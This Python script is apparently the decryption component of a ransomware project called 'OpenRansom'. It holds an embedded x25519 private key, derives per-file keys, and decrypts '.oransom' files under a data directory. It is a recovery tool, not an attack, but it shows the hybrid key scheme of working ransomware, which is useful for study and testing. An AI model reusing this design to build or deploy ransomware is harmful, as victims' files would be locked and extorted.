#!/usr/bin/python3
import os
import argparse
import fio
import crypto
import discover

EMBEDDED_PRIV="903dad73acc3bcbbe770f48e37b7811948c62246f05d2ea73fc2ac4a16854753"

def get_parser():
    parser = argparse.ArgumentParser(description='OpenRansom')
    parser.add_argument('-asym', '--asymmetric', help='Key Gen Algorithm', default="x25519")
    parser.add_argument('-sym', '--symmetric', help='Crypto Algorithm', default="AES")
    parser.add_argument('-k', '--key-len', help='Symmetric Key Length', default="128")
    parser.add_argument('-m', '--mode', help='AES mode', default="CTR")
    parser.add_argument('-w', '--write', help='Write method', default="O")
    parser.add_argument('-d', '--dir', help='Add the path to encrypt/decrypt', default='/mnt/home/Data')
    parser.add_argument('-ext', '--extension', help='Rename file with extension', default=None)
    return parser

def main():
    parser  = get_parser()
    args    = vars(parser.parse_args())
    asym = args['asymmetric']
    sym = args['symmetric']
    keylen = args['key_len']
    AES_mode = args['mode']
    write_mode = args['write']
    currentDir = args['dir']
    crypt_ext = True if args['extension'] == "default" else False

    match write_mode:
        case "O":
            callback = fio.encrypt_file_inplace
        case "WA":
            callback = fio.encrypt_file_writeafter
        case "WB":
            callback = fio.encrypt_file_writebefore

    mPriv = crypto.privateKey(bytes.fromhex(EMBEDDED_PRIV))
    #secrets_pad = False or (AES_mode in ['ECB', 'CBC'])
    iv_bytes, secret1, aPub = fio.read_secrets()
    shared1 = crypto.generate_shared_key(mPriv, aPub)
    
    cipher1, _, padding = crypto.get_sym_cipher(sym, AES_mode, shared1, 256, iv=iv_bytes)
    bPriv_bytes = crypto.encrypt_data(secret1, cipher1.decrypt, needUnpad=padding)
    bPriv = crypto.privateKey(bPriv_bytes)

    if crypt_ext or write_mode == "WB":
        #files = ["000387.txt.oransom"]
        files = discover.discoverFiles(currentDir, extensions=['oransom'])
    else:
        #files = ["000387.txt"]
        files = discover.discoverFiles(currentDir)
    for f in files:
        cPub_bytes = fio.read_file_pubkey(f)
        cPub = crypto.publicKey(cPub_bytes)
        shared2 = crypto.generate_shared_key(bPriv, cPub)
    
        cipher2, _, padding = crypto.get_sym_cipher(sym, AES_mode, shared2, keylen, iv=iv_bytes)
        callback(f, cipher2.decrypt, crypt_ext, needUnpad=padding)

if __name__=="__main__":
    main()
